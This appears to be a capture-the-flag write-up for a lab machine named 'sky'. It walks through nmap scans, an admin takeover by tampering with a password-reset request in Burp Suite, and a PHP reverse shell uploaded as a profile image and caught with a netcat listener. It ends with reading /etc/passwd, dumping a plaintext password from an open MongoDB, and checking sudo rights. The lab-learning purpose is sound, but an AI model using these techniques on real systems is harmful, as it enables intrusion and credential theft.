# Enumeration
## Nmap
Ran "Nmap -ST *IP* -p- -T4" to find all possible open ports.
Discovered that Port 22 and Port 80 were open.
Ran "Nmap -sV *IP* -p 22 -T4" and found Port 22 uses OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
Ran "Nmap -sV *IP* -p 80 -T4" and found Port 80 runs Apache httpd 2.4.41 (Ubuntu)
```console
┌─[zionglitch@parrot]─[~]
└──╼ $nmap -sT 10.10.116.209 -p- -T4
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-11 01:51 GMT
Nmap scan report for 10.10.116.209
Host is up (0.23s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 667.45 seconds
┌─[zionglitch@parrot]─[~]
└──╼ $nmap -sV 10.10.116.209 -p 22 -T4
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-11 02:05 GMT
Nmap scan report for 10.10.116.209
Host is up (0.25s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.23 seconds
┌─[zionglitch@parrot]─[~]
└──╼ $nmap -sV 10.10.116.209 -p 80 -T4
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-11 02:26 GMT
Nmap scan report for 10.10.116.209
Host is up (0.24s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.09 seconds
```
# Exploitation
Opening Metasploit and searching for any exploits did not result in any findings.
Next, went to the webpage of the IP, nothing of interest was found on any of the pages, and neither in the Source Code.
Clicking on "Merchant Central" allows us to create a login.
Basic SQL Injection did not work here.
We created an account and logged in.
Majority of the  pages here did not work, but an Profile/Edit Profile page revealed an admin email of ```admin@sky.thm```

Using this email as the username, and running basic SQL Injection on the password did not work.
We logged back in as the user we created and noticed a reset user field, this allows us to reset the password for our account, without requiring the previous password. However, the username field is grayed out and did not allow us to change it.

We launched burp suite and used Proxy/Intercept to intercept the POST message of when we type in the new password. Sure enough, Burp Suite intercepted the POST message, and we were able to change the username field to ```admin@sky.thm``` and the password to ```password```

We logged out of our account and sure enough were able to login as the admin. Now it was time to go back to the terminal and see if we can SSH with these new credentials.

Sadly, it did not work.
```console
┌─[zionglitch@parrot]─[~]
└──╼ $ssh admin@sky.thm@10.10.105.174
The authenticity of host '10.10.105.174 (10.10.105.174)' can't be established.
ECDSA key fingerprint is SHA256:zSoCEcBBY73hNL9ItPA4CnB/405/W6GQYsl94qRMkOo.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.105.174' (ECDSA) to the list of known hosts.
admin@sky.thm@10.10.105.174's password: 
Permission denied, please try again.
admin@sky.thm@10.10.105.174's password: 
Permission denied, please try again.
admin@sky.thm@10.10.105.174's password: 

┌─[✗]─[zionglitch@parrot]─[~]
└──╼ $ssh admin@10.10.105.174
admin@10.10.105.174's password: 
Permission denied, please try again.
admin@10.10.105.174's password: 
```
Going back to the website, we can see that the admin account is able to upload image files, let's try and upload a reverse shell file injection instead.
First let's find out win which directory the image is being uploaded by checking the profile picture.
It looks like it's located at *IP*/v2/profileimages.
Let's grab the following reverse shell php from GitHub, shoutout to Pentestmonkey.
```console
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
```
Let's edit the file and replace the IP with ours, and then open a new terminal and run Netcat.
```console
┌─[zionglitch@parrot]─[~]
└──╼ $nc -lvnp 1234
listening on [any] 1234 ...
```
Now all we need to do is upload the php file on the Webpage and then go to the following link.
```console
http://10.10.184.168/v2/profileimages/phpreverseshell.php
```
And BAM!
```console 
connect to [10.13.27.44] from (UNKNOWN) [10.10.184.168] 50762
Linux sky 5.4.0-73-generic #82-Ubuntu SMP Wed Apr 14 17:39:42 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 19:38:36 up 42 min,  0 users,  load average: 0.00, 0.00, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
```
# Post-Exploitation
## Finding the First Flag
Let's start poking around and look for a user.txt file.
```console
$ pwd
/
$ ls
bin
boot
cdrom
dev
etc
home
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
swap.img
sys
tmp
usr
var
$ cd home
$ ls
webdeveloper
$ cd webdeveloper
$ ls
user.txt
$ cat user.txt
********************************
```
And there it is, censored of course!
# Privilege Escalation
First and formost let's check our permissions.
```console
$ ls -l /etc/passwd
-rw-r--r-- 1 root root 1954 May 25  2021 /etc/passwd
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
webdeveloper:x:1000:1000:webdeveloper:/home/webdeveloper:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
mongodb:x:114:65534::/home/mongodb:/usr/sbin/nologin
```
MongoDB, that means we can likely fire up mongo and poke around in the database.
```console
$ mongo
mongo
MongoDB shell version v4.4.6
connecting to: mongodb://127.0.0.1:27017/?compressors=disabled&gssapiServiceName=mongodb
Implicit session: session { "id" : UUID("530b1e9b-2902-4385-94a4-402a699c8404") }
MongoDB server version: 4.4.6
Welcome to the MongoDB shell.
For interactive help, type "help".
For more comprehensive documentation, see
	https://docs.mongodb.com/
Questions? Try the MongoDB Developer Community Forums
	https://community.mongodb.com
---
The server generated these startup warnings when booting: 
        2021-12-12T18:44:20.021+00:00: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine. See http://dochub.mongodb.org/core/prodnotes-filesystem
        2021-12-12T18:45:02.022+00:00: Access control is not enabled for the database. Read and write access to data and configuration is unrestricted
---
---
        Enable MongoDB's free cloud-based monitoring service, which will then receive and display
        metrics about your deployment (disk utilization, CPU, operation statistics, etc).

        The monitoring data will be available on a MongoDB website with a unique URL accessible to you
        and anyone you share the URL with. MongoDB may use this information to make product
        improvements and to suggest MongoDB products and deployment options to you.

        To enable free monitoring, run the following command: db.enableFreeMonitoring()
        To permanently disable this reminder, run the following command: db.disableFreeMonitoring()
---
> show databases
shshow databases
admin   0.000GB
backup  0.000GB
config  0.000GB
local   0.000GB
> use backup       
ususe backup
switched to db backup
> show collections
shshow collections
collection
user
> db.user.find();
dbdb.user.find();
{ "_id" : ObjectId("60ae2661203d21857b184a76"), "Month" : "Feb", "Profit" : "25000" }
{ "_id" : ObjectId("60ae2677203d21857b184a77"), "Month" : "March", "Profit" : "5000" }
{ "_id" : ObjectId("60ae2690203d21857b184a78"), "Name" : "webdeveloper", "Pass" : "BahamasChapp123!@#" }
{ "_id" : ObjectId("60ae26bf203d21857b184a79"), "Name" : "Rohit", "EndDate" : "December" }
{ "_id" : ObjectId("60ae26d2203d21857b184a7a"), "Name" : "Rohit", "Salary" : "30000" }
```
Oh wow, a password! Let's switch to this user and see what we can do.
```console
> exit
exexit
bye
Error saving history file: FileOpenFailed Unable to open() file /var/www/.dbshell: Permission denied
www-data@sky:/$ su webdeveloper	
su webdeveloper
Password: BahamasChapp123!@#

webdeveloper@sky:/$ ls
ls
bin    dev   lib    libx32      mnt   root  snap      sys  var
boot   etc   lib32  lost+found  opt   run   srv       tmp
cdrom  home  lib64  media       proc  sbin  swap.img  usr
webdeveloper@sky:/$ cd root
cd root
bash: cd: root: Permission denied
webdeveloper@sky:/$ sudo -l
sudo -l
Matching Defaults entries for webdeveloper on sky:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User webdeveloper may run the following commands on sky:
    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility
webdeveloper@sky:/$ 
```
Hmm, I am not sure what all of this means so it's time to do a little research on what all these commands are.
